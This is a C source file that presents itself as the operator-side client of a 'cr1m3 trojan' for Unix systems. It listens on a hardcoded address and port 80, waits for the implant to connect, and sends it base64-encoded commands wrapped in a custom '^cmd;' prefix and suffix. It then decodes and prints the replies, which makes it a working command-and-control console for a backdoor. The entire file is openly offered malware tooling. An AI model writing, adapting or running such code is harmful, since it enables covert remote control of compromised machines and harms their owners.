/**
 * @file cr1m3_client.c
 * @brief Client of cr1m3 trojan for unix shell
 * @author Jennylab
 * @date sáb mar 29 02:45:23 CET 2014
 */

#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#include <openssl/sha.h>
#include <openssl/hmac.h>



#define PREFFIX "cr1m3-cli~> "
#define STR_RETURN "\n\r"
#define CMD_PREFFIX "^cmd;"
#define SUFFIX ";adadsdadad"


char *base64_encode(const unsigned char *input, int size);
char *base64_decode(const unsigned char *input, int size);



int main(int argc, char argv[]) {
	__start_client("192.168.15.113",80);
}

/**
 * @brief This function bind handle for cr1m3 trojan
 * @returns avoid return
 */
int __start_client(char *host,int port) {
    int sock = 0;
    int client_sock = 0;
    socklen_t addr_size = {0};
    socklen_t addr_out = {0};
    struct sockaddr_in sin = {0};
    struct sockaddr_in client = {0};
    struct timeval timeout = {0};
    char *snd_buff = calloc(2048,1);
    char *buff = calloc(2048,1);
    char *snd_cmd = calloc(2058,1);
    int read_len=0;
    char *encoded_buff = (char *)0;
 
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sin.sin_addr.s_addr = INADDR_ANY;
    inet_pton(AF_INET,host,&sin.sin_addr);
  
    addr_size = sizeof(sin);


    if ((sock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1){
        perror("socket");
        return EXIT_FAILURE;
    }
/*
    if (setsockopt(sock, SOL_SOCKET,SO_SNDTIMEO, (char *)&timeout, sizeof(timeout)) == -1){
        perror("setsockopt");
        return EXIT_FAILURE;
    }
    
    if (setsockopt(sock, SOL_SOCKET,SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) == -1){
        perror("setsockopt");
        return EXIT_FAILURE;
    }
*/
    printf("Binding socket...\t");
  
   if (bind(sock,(struct sockaddr *)&sin, addr_size)==-1) {
	perror("bind");
	return EXIT_FAILURE;
   }

   printf("OK\n");
   
    listen(sock,5); 
    printf("Listening handle in port %d...\t", port);

    if((client_sock = accept(sock, (struct sockaddr *)&client, (socklen_t *)&addr_out))==-1) {
	perror("accept");
        return EXIT_FAILURE;
    }

    printf("OK\n");
    

    do {
	write(2,STR_RETURN,strlen(STR_RETURN));

	if(strlen(buff)>2) {
		encoded_buff = base64_decode(buff,strlen(buff));
		printf("Decoded: %s\n", encoded_buff);
		write(2,encoded_buff,strlen(encoded_buff));
	}
	else
		write(2,buff,strlen(buff));
	
	write(2,STR_RETURN,strlen(STR_RETURN));
	write(2,PREFFIX,strlen(PREFFIX));
	
	scanf("%2040s", snd_buff);

	if(snd_buff[0]=='^') {
		if(strlen(snd_buff)+strlen(SUFFIX)<2048) {
			strncpy(snd_cmd, snd_buff, strlen(snd_buff));
			strncat(snd_cmd, SUFFIX, strlen(SUFFIX));
			encoded_buff = base64_encode(snd_cmd,strlen(snd_cmd));
			if(sendto(client_sock,encoded_buff,strlen(encoded_buff),0,(struct sockaddr *)&client,addr_out)==-1) 
				perror("Send");
		}
		
	}
	else {
		strncpy(snd_cmd, CMD_PREFFIX, strlen(CMD_PREFFIX));
		if(strlen(snd_buff)+strlen(CMD_PREFFIX)+strlen(SUFFIX)<2048) {
			strncat(snd_cmd, snd_buff, strlen(snd_buff));
			strncat(snd_cmd, SUFFIX, strlen(SUFFIX));
			encoded_buff = base64_encode(snd_cmd,strlen(snd_cmd));
		}
		else
			perror("fucking overflow");
		

		if(sendto(client_sock,encoded_buff,strlen(encoded_buff),0,(struct sockaddr *)&client,addr_out)==-1)
			perror("Send");
		
	}
		

	bzero(snd_cmd,2050);
	bzero(buff, 2048);
 	bzero(snd_buff,2048);

    } while((read_len=recvfrom(client_sock,buff, 2048,0,(struct sockaddr *)&client,(socklen_t *)&addr_out))!=-1);
   

    shutdown(sock,0);
    close(sock);
    return(0);
}


char *base64_encode(const unsigned char *input, int size)
{
        BIO *bmem, *b64;
        BUF_MEM *bptr;

        b64 = BIO_new(BIO_f_base64());
        bmem = BIO_new(BIO_s_mem());
        b64 = BIO_push(b64, bmem);
        BIO_write(b64, input, size);
        BIO_flush(b64);
        BIO_get_mem_ptr(b64, &bptr);

        char *buff = (char *)malloc(bptr->length);
        bzero(buff,bptr->length);
        memcpy(buff, bptr->data, bptr->length-1);
        buff[bptr->length-1] = 0;

        BIO_free_all(b64);

        return buff;
}



char *base64_decode(const unsigned char *input, int size)
{
        BIO *bmem, *b64;
	char *buff = calloc(2048,1);

	printf("%s\n", input);

        b64 = BIO_new(BIO_f_base64());
        bmem = BIO_new_mem_buf(input,size);
        bmem = BIO_push(b64, bmem);
        BIO_read(bmem, buff, size);
        BIO_free_all(b64);

        return buff;
}



